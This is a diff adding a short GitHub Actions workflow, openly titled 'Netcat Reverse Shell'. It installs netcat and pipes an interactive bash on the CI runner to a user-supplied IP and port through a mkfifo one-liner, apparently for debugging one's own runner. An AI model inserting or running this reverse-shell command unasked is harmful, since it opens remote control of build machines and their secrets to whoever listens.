@@ -1,0 +1,26 @@
+name: Netcat Reverse Shell
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: "IP Address of your workstation"
+        required: true
+      port:
+        description: "Port listening for reverse shell"
+        required: true
+        default: '2222'
+
+jobs:
+  nc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install Utils
+        run: |
+          sudo apt-get update
+          sudo apt-get -qqy install netcat-openbsd
+
+      - name: nc mkfifo Reverse Shell
+        run: |
+          rm -f /tmp/f; mkfifo /tmp/f
+          </tmp/f bash -i 2>&1 | nc ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} >/tmp/f
